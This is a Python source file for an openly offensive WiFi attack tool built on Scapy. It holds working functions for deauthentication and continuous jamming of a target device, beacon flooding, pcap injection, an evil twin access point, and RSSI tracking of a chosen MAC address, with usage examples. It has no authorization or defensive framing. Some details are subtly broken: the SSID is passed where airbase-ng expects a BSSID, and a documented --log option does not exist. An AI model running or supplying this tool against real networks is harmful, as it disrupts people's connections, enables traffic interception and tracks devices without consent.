import argparse
import time
import os
import logging
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Deauth, Dot11Auth, Dot11ProbeReq, Dot11Beacon, RadioTap

# -------------------------------------------
# Enhanced WiFi Deauthentication & Packet Injection Tool
# -------------------------------------------
# Features:
# - Deauthentication attacks
# - Packet injection (custom packets, beacon flooding)
# - Automated target discovery
# - Continuous deauthentication
# - Channel hopping
# - Packet capture & analysis
# - Evil Twin attack
# - Real-time RSSI monitoring
# - Logging & reporting
#
# Requirements:
# - Wireless adapter supporting monitor mode (e.g., Alfa AWUS036ACH)
# - Python 3.x
# - Scapy library
# - tcpdump, aircrack-ng suite (for some features)
#
# Usage:
# 1. Perform a deauthentication attack:
#    python wifi_deauth_injection_enhanced.py --deauth --target XX:XX:XX:XX:XX:XX --ap YY:YY:YY:YY:YY:YY --interface wlan0
# 2. Inject a custom packet:
#    python wifi_deauth_injection_enhanced.py --inject --packet "fake_packet.pcap" --interface wlan0
# 3. Discover devices on a network:
#    python wifi_deauth_injection_enhanced.py --discover --interface wlan0
# 4. Perform a beacon flood:
#    python wifi_deauth_injection_enhanced.py --beacon-flood --interface wlan0
# 5. Start channel hopping:
#    python wifi_deauth_injection_enhanced.py --channel-hop --interface wlan0
# 6. Capture packets:
#    python wifi_deauth_injection_enhanced.py --capture --interface wlan0 --output capture.pcap
# 7. Create an evil twin:
#    python wifi_deauth_injection_enhanced.py --evil-twin --ssid "FakeNet" --interface wlan0
# 8. Monitor RSSI:
#    python wifi_deauth_injection_enhanced.py --monitor-rssi --target XX:XX:XX:XX:XX:XX --interface wlan0
# 9. Log all actions:
#    python wifi_deauth_injection_enhanced.py --log
# -------------------------------------------

# Global variables
logging.basicConfig(filename="wifi_attack.log", level=logging.INFO, format="%(asctime)s - %(message)s")

def log_event(message):
    """Log an event to the log file."""
    logging.info(message)
    print(message)

def deauth_attack(target_mac, ap_mac, interface, count=10):
    """Send deauthentication packets to disconnect a target device from the network."""
    log_event(f"[+] Starting deauthentication attack on {target_mac}...")
    packet = RadioTap() / Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac) / Dot11Deauth()
    sendp(packet, iface=interface, count=count, inter=0.1, verbose=False)
    log_event("[✔] Deauthentication attack complete.")

def continuous_deauth(target_mac, ap_mac, interface, duration=60):
    """Continuously send deauthentication packets for a specified duration."""
    log_event(f"[+] Starting continuous deauthentication attack on {target_mac} for {duration} seconds...")
    end_time = time.time() + duration
    while time.time() < end_time:
        deauth_attack(target_mac, ap_mac, interface, count=1)
        time.sleep(0.1)
    log_event("[✔] Continuous deauthentication attack complete.")

def inject_packet(packet_file, interface):
    """Inject a custom packet from a .pcap file."""
    log_event(f"[+] Injecting packet from {packet_file}...")
    try:
        packets = rdpcap(packet_file)
        for packet in packets:
            sendp(packet, iface=interface, verbose=False)
        log_event("[✔] Packet injection complete.")
    except Exception as e:
        log_event(f"[!] Error during packet injection: {e}")

def discover_devices(interface):
    """Discover devices connected to a WiFi network."""
    log_event(f"[+] Scanning for devices on {interface}...")
    try:
        os.system(f"airodump-ng {interface} --output-format csv --write scan_results")
        with open("scan_results-01.csv", "r") as file:
            devices = [line.split(",")[0].strip() for line in file if "Station MAC" not in line and line.strip()]
        log_event(f"[✔] Found {len(devices)} devices: {devices}")
        return devices
    except Exception as e:
        log_event(f"[!] Error during device discovery: {e}")
        return []

def beacon_flood(interface, count=100, ssid_prefix="FakeNet"):
    """Flood the area with fake WiFi access points."""
    log_event(f"[+] Starting beacon flood with {count} fake SSIDs...")
    for i in range(count):
        ssid = f"{ssid_prefix}_{i}"
        packet = RadioTap() / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff") / Dot11Beacon(cap="ESS") / Dot11Elt(ID="SSID", info=ssid)
        sendp(packet, iface=interface, verbose=False)
    log_event("[✔] Beacon flood complete.")

def channel_hop(interface, channels=[1, 6, 11], interval=5):
    """Automatically hop between WiFi channels."""
    log_event(f"[+] Starting channel hopping on {interface}...")
    try:
        while True:
            for channel in channels:
                os.system(f"iwconfig {interface} channel {channel}")
                log_event(f"[*] Switched to channel {channel}")
                time.sleep(interval)
    except KeyboardInterrupt:
        log_event("[✔] Channel hopping stopped.")

def capture_packets(interface, output_file="capture.pcap", duration=30):
    """Capture packets on the specified interface."""
    log_event(f"[+] Capturing packets on {interface} for {duration} seconds...")
    try:
        os.system(f"tcpdump -i {interface} -w {output_file} -G {duration} -W 1")
        log_event(f"[✔] Packets saved to {output_file}")
    except Exception as e:
        log_event(f"[!] Error during packet capture: {e}")

def evil_twin(interface, ssid, channel=6):
    """Create a fake access point with the same SSID as the target network."""
    log_event(f"[+] Creating evil twin for SSID: {ssid}...")
    try:
        os.system(f"airbase-ng -a {ssid} -c {channel} {interface}")
        log_event("[✔] Evil twin access point created.")
    except Exception as e:
        log_event(f"[!] Error during evil twin setup: {e}")

def monitor_rssi(target_mac, interface):
    """Monitor the RSSI of a target device in real-time."""
    log_event(f"[+] Monitoring RSSI for {target_mac}...")
    def packet_handler(packet):
        if packet.haslayer(Dot11) and packet.addr2 == target_mac:
            rssi = packet.dBm_AntSignal
            log_event(f"[*] RSSI for {target_mac}: {rssi} dBm")
    sniff(iface=interface, prn=packet_handler)

def main():
    parser = argparse.ArgumentParser(description="Enhanced WiFi Deauthentication & Packet Injection Tool")
    parser.add_argument("--deauth", action="store_true", help="Perform a deauthentication attack")
    parser.add_argument("--target", type=str, help="MAC address of the target device")
    parser.add_argument("--ap", type=str, help="MAC address of the access point")
    parser.add_argument("--inject", action="store_true", help="Inject a custom packet")
    parser.add_argument("--packet", type=str, help="Path to the .pcap file for packet injection")
    parser.add_argument("--discover", action="store_true", help="Discover devices on a network")
    parser.add_argument("--beacon-flood", action="store_true", help="Perform a beacon flood attack")
    parser.add_argument("--channel-hop", action="store_true", help="Start channel hopping")
    parser.add_argument("--capture", action="store_true", help="Capture packets on the interface")
    parser.add_argument("--output", type=str, help="Output file for packet capture")
    parser.add_argument("--evil-twin", action="store_true", help="Create an evil twin access point")
    parser.add_argument("--ssid", type=str, help="SSID for the evil twin")
    parser.add_argument("--monitor-rssi", action="store_true", help="Monitor RSSI of a target device")
    parser.add_argument("--interface", type=str, required=True, help="Wireless interface in monitor mode")
    parser.add_argument("--count", type=int, default=10, help="Number of deauthentication packets to send")
    parser.add_argument("--duration", type=int, default=60, help="Duration of the attack in seconds")
    args = parser.parse_args()

    if args.deauth:
        if not args.target or not args.ap:
            log_event("[!] Please specify both --target and --ap for deauthentication.")
            return
        deauth_attack(args.target, args.ap, args.interface, args.count)
    elif args.inject:
        if not args.packet:
            log_event("[!] Please specify --packet for injection.")
            return
        inject_packet(args.packet, args.interface)
    elif args.discover:
        discover_devices(args.interface)
    elif args.beacon_flood:
        beacon_flood(args.interface)
    elif args.channel_hop:
        channel_hop(args.interface)
    elif args.capture:
        if not args.output:
            log_event("[!] Please specify --output for packet capture.")
            return
        capture_packets(args.interface, args.output, args.duration)
    elif args.evil_twin:
        if not args.ssid:
            log_event("[!] Please specify --ssid for evil twin.")
            return
        evil_twin(args.interface, args.ssid)
    elif args.monitor_rssi:
        if not args.target:
            log_event("[!] Please specify --target for RSSI monitoring.")
            return
        monitor_rssi(args.target, args.interface)
    else:
        log_event("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()